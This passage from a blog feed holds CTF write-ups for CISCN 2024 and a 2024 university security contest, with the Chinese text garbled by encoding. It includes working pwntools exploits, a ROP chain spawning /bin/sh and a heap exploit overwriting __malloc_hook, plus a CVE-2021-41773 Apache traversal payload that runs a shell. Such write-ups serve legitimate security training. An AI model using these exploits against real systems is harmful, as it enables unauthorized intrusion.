class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;8.147.133.63&quot;</span>, <span class="number">17147</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x404043</span></span><br><span class="line">rax_ret = <span class="number">0x40f984</span></span><br><span class="line">rdi_ret = <span class="number">0x4a18a5</span></span><br><span class="line">rsi_ret = <span class="number">0x42138a</span></span><br><span class="line">rdx_ret = <span class="number">0x4944ec</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(elf.bss()) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">0x18</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(rsi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(rdx_ret) + p64(<span class="number">0x100</span>) + p64(rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(rdx_ret) + p64(<span class="number">0</span>) + p64(rax_ret) + p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="orange-cat-diar"><a href="#orange-cat-diar" class="headerlink" title="orange_cat_diar"></a>orange_cat_diar</h2><p>æœ‰ä¸ªUAF</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607114611892-716076837.png" alt="image-20240607114610173"></p><p>ç„¶åå°±æ˜¯house of orangeï¼Œæ‰“unsorted bin attackæ³„éœ²libcåŸºå€ï¼Œç„¶åæ”¹malloc_hook</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./orange_cat_diary&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.128.251&#x27;</span>, <span class="number">17907</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>, <span class="string">&#x27;rweb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">1640</span> - <span class="number">0x10</span></span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x13</span>) + p64(libc_addr + one[<span class="number">2</span>]))</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ› CISCN 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>é«˜æ ¡ç½‘ç»œå®‰å…¨ç®¡ç†è¿ç»´èµ›2024</title>
    <link href="https://www.fomal.cc/posts/17915e48.html"/>
    <id>https://www.fomal.cc/posts/17915e48.html</id>
    <published>2024-05-14T07:34:35.000Z</published>
    <updated>2024-06-06T11:11:47.127Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>GIF æ‹†åˆ† å­—ç¬¦æ‹¼æ¥</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;guvf-vf-gur-fvtava-dhvm&#125;</span><br><span class="line"></span><br><span class="line">ROT13:</span><br><span class="line">flag&#123;this-is-the-signin-quiz&#125;</span><br></pre></td></tr></table></figure><h2 id="é’“é±¼é‚®ä»¶è¯†åˆ«"><a href="#é’“é±¼é‚®ä»¶è¯†åˆ«" class="headerlink" title="é’“é±¼é‚®ä»¶è¯†åˆ«"></a>é’“é±¼é‚®ä»¶è¯†åˆ«</h2><p>æ‰“å¼€eml<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png#averageHue=%23f0eeed&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=581&amp;id=udff21a67&amp;originHeight=872&amp;originWidth=1680&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=95596&amp;status=done&amp;style=none&amp;taskId=u05ad4560-fb10-4616-898b-cda133bda73&amp;title=&amp;width=1120" alt="image.png"><br>base64è§£ç <br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png#averageHue=%23f0eeee&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=796&amp;id=u40cbeb7d&amp;originHeight=1194&amp;originWidth=1217&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=299105&amp;status=done&amp;style=none&amp;taskId=u452493a0-5876-4ab4-a782-0e3fd32b6b6&amp;title=&amp;width=811.3333333333334" alt="image.png"></p><h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png#averageHue=%23f2f0f0&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=154&amp;id=u298f23e6&amp;originHeight=231&amp;originWidth=1207&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=57021&amp;status=done&amp;style=none&amp;taskId=u629f2172-4f06-471e-ae52-b029e298d61&amp;title=&amp;width=804.6666666666666" alt="image.png"></p><h3 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png#averageHue=%23e5e5e1&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=56&amp;id=uc548bc24&amp;originHeight=84&amp;originWidth=283&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=10693&amp;status=done&amp;style=none&amp;taskId=u21d028cf-74ce-4e2b-8c6e-c25ddd55428&amp;title=&amp;width=188.66666666666666" alt="image.png"></p><h3 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h3><p>ç¬¬ä¸‰æ®µè§£æDNSçš„è®°å½•<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=736&amp;id=u91730a03&amp;originHeight=1104&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=117830&amp;status=done&amp;style=none&amp;taskId=u76ac0f79-b444-4261-96e7-e57dbf97cb5&amp;title=&amp;width=1006" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=819&amp;id=u0f3a6024&amp;originHeight=1228&amp;originWidth=1787&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=156994&amp;status=done&amp;style=none&amp;taskId=ua783e53a-f8ac-4e0c-8f39-bbce8619212&amp;title=&amp;width=1191.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png#averageHue=%23f4f4f4&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=743&amp;id=ud216f656&amp;originHeight=1114&amp;originWidth=1757&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=122717&amp;status=done&amp;style=none&amp;taskId=ua65b1fa8-c3b3-4e1d-8277-02485e45c02&amp;title=&amp;width=1171.3333333333333" alt="image.png"></p><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>è¿½è¸ªæµåˆ°å€’æ•°å‡ ä¸ªæœåŠ¡å™¨æµé‡è§£å¯†å‘ç°å¦‚ä¸‹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png#averageHue=%23f1eee3&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=685&amp;id=uae05dd4f&amp;originHeight=1028&amp;originWidth=2273&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=365427&amp;status=done&amp;style=none&amp;taskId=u9d4285e5-ac30-459f-9259-d4cf393aa7c&amp;title=&amp;width=1515.3333333333333" alt="image.png"><br>pkå¤´ï¼Œæ˜¯zipï¼Œä¿å­˜æˆzipæ–‡ä»¶<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png#averageHue=%23e6e5e4&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=533&amp;id=u89338278&amp;originHeight=799&amp;originWidth=2301&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=287706&amp;status=done&amp;style=none&amp;taskId=ucc729f83-9ae1-45ca-95c0-a6d56ce6d5f&amp;title=&amp;width=1534" alt="image.png"><br>è¿˜å‘ç°äº†secret2.txtçš„å†…å®¹<br>ç”¨ä¸Šè¿°txtï¼Œæ˜æ–‡æ”»å‡»zip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png#averageHue=%23161616&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;height=177&amp;id=ua192efbe&amp;originHeight=276&amp;originWidth=1306&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=35216&amp;status=done&amp;style=none&amp;taskId=u21076285-af22-44b2-a780-639183be2db&amp;title=&amp;width=835.84" alt="image.png"><br>ç”¨æ˜æ–‡æ”»å‡»è·å–åˆ°çš„keyç›´æ¥è§£secret1.txt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png#averageHue=%23e9e8e7&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=371&amp;id=uabab6e87&amp;originHeight=557&amp;originWidth=571&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=114715&amp;status=done&amp;style=none&amp;taskId=u3e46b3da-e009-42ed-9215-d3124941c50&amp;title=&amp;width=380.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png#averageHue=%23d1a970&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=231&amp;id=udaace66e&amp;originHeight=347&amp;originWidth=1335&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=68080&amp;status=done&amp;style=none&amp;taskId=u6f8be26f-5e1e-4c2f-b7c1-23145c69071&amp;title=&amp;width=890" alt="image.png"></p><h2 id="SecretDB"><a href="#SecretDB" class="headerlink" title="SecretDB"></a>SecretDB</h2><p>ç”¨DB Browser for SQLiteæŸ¥çœ‹æ•°æ®åº“ï¼Œä½†æ˜¯è¯´flagä¸åœ¨è¿™é‡Œ<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png#averageHue=%23f7f7f6&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=313&amp;id=u586e86e7&amp;originHeight=391&amp;originWidth=1266&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=30839&amp;status=done&amp;style=none&amp;taskId=u4e4db746-4cc3-4594-93e8-d9d9b968c13&amp;title=&amp;width=1012.8" alt="image.png"><br>æ”¾åˆ°010ä¸­ï¼Œå‘ç°è¿™å¥è¯ä¸‹é¢è¿˜è—ç€ç‚¹ä¸œè¥¿ï¼Œåœ¨01 0Fä¹‹é—´æœ‰ä¸œè¥¿<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png#averageHue=%2386c292&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=406&amp;id=tOoxc&amp;originHeight=508&amp;originWidth=659&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=55792&amp;status=done&amp;style=none&amp;taskId=u489604f7-52c6-4411-ad0d-04475762b90&amp;title=&amp;width=527.2" alt="image.png"><br>ç„¶åå†™è„šæœ¬è¿›è¡Œæå–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"></span><br><span class="line">flag = &#123;&#125;</span><br><span class="line">parts = c.split(<span class="string">b&#x27;\x01\x0f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> parts[<span class="number">1</span>:-<span class="number">2</span>]:  <span class="comment"># ä¿®æ­£åˆ‡ç‰‡èŒƒå›´</span></span><br><span class="line">    flag[i[<span class="number">0</span>]] = <span class="built_in">chr</span>(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥æŒ‰ç…§æ’åºåçš„é”®å€¼å¯¹æ‰“å°ç»“æœ</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(flag.keys()):</span><br><span class="line">    <span class="built_in">print</span>(flag[k], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨ä¸‹é¢çš„ä¸€è¡Œä»£ç æ¥æ›¿ä»£ä¸Šé¢çš„ for å¾ªç¯</span></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join([flag[k] for k in sorted(flag.keys())]))</span></span><br></pre></td></tr></table></figure><h2 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h2><p>åœ¨é™„ä»¶ä¸­æ‰¾åˆ°äº†å¯†ç ï¼Œä½†è¿˜æ˜¯ç¼–ç çš„<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png#averageHue=%23fcfaf9&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=546&amp;id=pD8i3&amp;originHeight=682&amp;originWidth=1429&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=106870&amp;status=done&amp;style=none&amp;taskId=u5b2fa89a-8cf7-4209-b10f-a85f6b49e4c&amp;title=&amp;width=1143.2" alt="image.png"><br>åœ¨é¢˜ç›®é™„ä»¶é‡Œå‘ç°è¿™ä¸ªï¼Œè”æƒ³åˆ°ç”µä¿¡å…‰çŒ«çš„è¶…å¯†è§£å¯†<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png#averageHue=%23e4f2f0&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=84&amp;id=u807f3ad5&amp;originHeight=105&amp;originWidth=534&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=46720&amp;status=done&amp;style=none&amp;taskId=uee655861-9d30-49c5-988f-6d76061f717&amp;title=&amp;width=427.2" alt="image.png"><br>å‚è€ƒå†…å®¹<br><a href="https://cloud.tencent.com/developer/article/2006614">ç ´è§£å…‰çŒ«è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œä¹Ÿå°±æ˜¯è·å–telecomadminçš„å¯†ç </a><br>æŠŠé‡Œé¢çš„æ•°å­—æå–ï¼Œç„¶åä¸‰ä½æ•°çš„å†…å®¹æŠŠæ•°å­—å‡æ‰4ï¼Œä»ASCIIè½¬å­—ç¬¦å³å¯ï¼Œå…¶ä»–éƒ¨åˆ†ç›´æ¥ä»ASCIIè½¬æˆå­—ç¬¦å³å¯ï¼Œæ‹¼åœ¨ä¸€èµ·</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = <span class="selector-attr">[106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]</span></span><br><span class="line"></span><br><span class="line">decode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> <span class="comment">// 100 != 0:</span></span><br><span class="line">        decode += <span class="built_in">chr</span>(<span class="selector-tag">i</span> - <span class="number">4</span>)    #ä¸‰ä½æ•°çš„æŒ‰å­—æ¯å¤„ç†</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decode += <span class="built_in">chr</span>(i)        #ä¸¤ä½æ•°çš„æŒ‰æ•°å­—å¤„ç†</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(decode)</span></span></span><br></pre></td></tr></table></figure><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><ul><li>æºç ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,send_file</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;webserver&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dstport=<span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">        data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        recvdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">2048</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                recvdata += chunk</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> recvdata</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>CVE-2021-41773<br><a href="https://blog.csdn.net/luochen2436/article/details/120698682">https://blog.csdn.net/luochen2436/article/details/120698682</a><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">port</span>=<span class="number">80</span>&amp;data=POST%<span class="number">20</span>%<span class="number">2</span>fcgi-bin%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>fbin%<span class="number">2</span>fsh%<span class="number">20</span>HTTP%<span class="number">2</span>f1.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost%<span class="number">3</span>a%<span class="number">20127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept%<span class="number">3</span>a%<span class="number">20</span>*%<span class="number">2</span>f*%<span class="number">0</span>d%<span class="number">0</span>aAccept-Language%<span class="number">3</span>a%<span class="number">20</span>zh-CN%<span class="number">2</span>czh%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">8</span>%<span class="number">2</span>czh-TW%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">7</span>%<span class="number">2</span>czh-HK%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">5</span>%<span class="number">2</span>cen-US%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">3</span>%<span class="number">2</span>cen%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">2</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept-Encoding%<span class="number">3</span>a%<span class="number">20</span>gzip%<span class="number">2</span>c%<span class="number">20</span>deflate%<span class="number">0</span>d%<span class="number">0</span>aContent-Type%<span class="number">3</span>a%<span class="number">20</span>application%<span class="number">2</span>fx-www-form-urlencoded%<span class="number">0</span>d%<span class="number">0</span>aCache%<span class="number">3</span>a%<span class="number">20</span>no-cache%<span class="number">0</span>d%<span class="number">0</span>aContent-Length%<span class="number">3</span>a%<span class="number">2012</span>%<span class="number">0</span>d%<span class="number">0</span>aConnection%<span class="number">3</span>a%<span class="number">20</span>close%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aecho%<span class="number">3</span>bcat%<span class="number">20</span>%<span class="number">2</span>ff*%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h2 id="f-or-r"><a href="#f-or-r" class="headerlink" title="f or r"></a>f or r</h2><p>ä¸€å±‚ä¸€å±‚è§£å‹.cabæ–‡ä»¶ï¼Œæ‰¾åˆ°Cab for KB114514 PSFXï¼Œå‘ç°è·Ÿå‰ä¸¤å¤©çš„GeekCTFçš„é¢˜æœ‰ç‚¹åƒ<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png#averageHue=%23f8f7f5&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=128&amp;id=u4475e9fb&amp;originHeight=192&amp;originWidth=496&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=11091&amp;status=done&amp;style=none&amp;taskId=u02652051-23f7-4995-b420-0dbb8af714b&amp;title=&amp;width=330.6666666666667" 